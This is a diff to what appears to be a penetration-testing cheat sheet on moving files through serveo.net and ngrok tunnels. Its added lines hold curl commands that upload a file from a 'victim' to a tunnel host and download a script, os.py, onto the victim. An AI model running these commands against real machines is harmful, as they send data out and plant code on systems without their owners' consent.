@@ -292,13 +292,20 @@ from new terminal --> xfreerdp /v:localhost:<22> /u:<> /p:<>
 Transfer file using curl externally :
 1- sudo service apache2 start
 2- ssh -R 80:192.168.1.16:8080 serveo.net
-3- python file_upload_server.py <forwarded port 8080> --> to upload from victim
-4- python -m http.server <forwarded port 8080> --> to download to victim
-5- curl -F "file=@o.txt" <https://dd8db79ed3eb810161585741f4a60132.serveo.net>
+3- to upload from the victim :
+   python file_upload_server.py <forwarded port 8080> 
+   curl -F "file=@o.txt" <https://dd8db79ed3eb810161585741f4a60132.serveo.net>
+4- to download into the victim :
+   python -m http.server <forwarded port 8080> 
+   curl <https://dd8db79ed3eb810161585741f4a60132.serveo.net/os.py -o os.py> 
 or 
 1- ngrok http 8080
-2- python file_upload_server.py <forwarded port 8080>
-3- curl -F "file=@o.txt" <https://d335-5-149-250-239.ngrok-free.app> 
+2- to upload from the victim :
+   python file_upload_server.py <forwarded port 8080> 
+   curl -F "file=@o.txt" <https://d335-5-149-250-239.ngrok-free.app>
+3- to download into the victim :
+   python -m http.server <forwarded port 8080> 
+   curl <https://https://d335-5-149-250-239.ngrok-free.app/os.py -o os.py> 
 ---------------------------------------------------------------------------------------------------------------
 ngrok multiple ports in the same windows :
 1- in the config file :
